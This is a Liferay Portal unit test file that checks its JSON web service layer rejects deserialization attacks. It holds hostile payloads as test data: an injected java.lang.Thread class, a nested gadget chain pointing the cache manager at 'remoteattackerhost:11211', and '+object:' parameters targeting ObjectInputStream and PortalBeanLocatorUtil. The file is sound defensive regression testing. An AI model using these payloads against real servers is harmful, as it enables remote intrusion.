/**
 * SPDX-FileCopyrightText: (c) 2000 Liferay, Inc. https://liferay.com
 * SPDX-License-Identifier: LGPL-2.1-or-later OR LicenseRef-Liferay-DXP-EULA-2.0.0-2023-06
 */

package com.liferay.portal.jsonwebservice;

import com.liferay.petra.string.StringBundler;
import com.liferay.portal.jsonwebservice.action.JSONWebServiceInvokerAction;
import com.liferay.portal.kernel.jsonwebservice.JSONWebServiceAction;
import com.liferay.portal.kernel.util.PropsKeys;
import com.liferay.portal.test.rule.LiferayUnitTestRule;
import com.liferay.registry.Registry;
import com.liferay.registry.RegistryUtil;
import com.liferay.registry.ServiceRegistration;

import java.util.Collections;

import jodd.typeconverter.TypeConversionException;

import junit.framework.TestCase;

import org.junit.BeforeClass;
import org.junit.ClassRule;
import org.junit.Rule;
import org.junit.Test;

import org.springframework.mock.web.MockHttpServletRequest;

/**
 * @author Igor Spasic
 */
public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {

	@ClassRule
	@Rule
	public static final LiferayUnitTestRule liferayUnitTestRule =
		LiferayUnitTestRule.INSTANCE;

	@BeforeClass
	public static void setUpClass() throws Exception {
		initPortalServices();

		registerActionClass(OpenService.class);
	}

	@Test
	public void testAttack1() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run1/foo-ids/[1,2,{\"class\":\"java.lang.Thread\"}]");

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}
	}

	@Test
	public void testAttack2() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/open/run2");

		StringBundler sb = new StringBundler(16);

		sb.append("{\"class\":");
		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");

		sb.append("\"entityCache\":{\"class\":");
		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");

		sb.append("\"multiVMPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");

		sb.append("\"portalCacheManager\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.memcached.");
		sb.append("MemcachePortalCacheManager\",\"timeout\":60,\"");
		sb.append("timeoutTimeUnit\":\"SECONDS\",");

		sb.append("\"memcachedClientPool\":{\"class\":");
		sb.append("\"com.liferay.portal.cache.memcached.");
		sb.append("DefaultMemcachedClientFactory\",");

		sb.append("\"connectionFactory\":{\"class\":");
		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");

		mockHttpServletRequest.setParameter("bytes", sb.toString());

		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
			mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}
	}

	@Test(expected = TypeConversionException.class)
	public void testAttack3NotOnWhitelistCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter(
			"+object:java.io.ObjectInputStream", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test(expected = IllegalArgumentException.class)
	public void testAttack3UtilCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter(
			"+object:com.liferay.portal.kernel.bean.PortalBeanLocatorUtil",
			"{\"beanLocator\":null}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test
	public void testAttack3ValidCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.lang.Object", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

	@Test
	public void testAttack3WhitelistedByOSGiCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.util.Random", "{}");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		try {
			jsonWebServiceAction.invoke();

			TestCase.fail();
		}
		catch (Exception exception) {
		}

		Registry registry = RegistryUtil.getRegistry();

		ServiceRegistration<Object> serviceRegistration =
			registry.registerService(
				Object.class, new Object(),
				Collections.singletonMap(
					PropsKeys.
						JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES,
					new String[] {"java.util.Random", "some.other.Class"}));

		try {
			jsonWebServiceAction.invoke();
		}
		finally {
			serviceRegistration.unregister();
		}
	}

	@Test
	public void testAttack3WhitelistedByPropertiesCall() throws Exception {
		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
			"/invoke");

		mockHttpServletRequest.setParameter("cmd", "{\"/open/run3\":{}}");
		mockHttpServletRequest.setParameter("+object:java.util.Date", "0");

		JSONWebServiceAction jsonWebServiceAction =
			new JSONWebServiceInvokerAction(mockHttpServletRequest);

		jsonWebServiceAction.invoke();
	}

}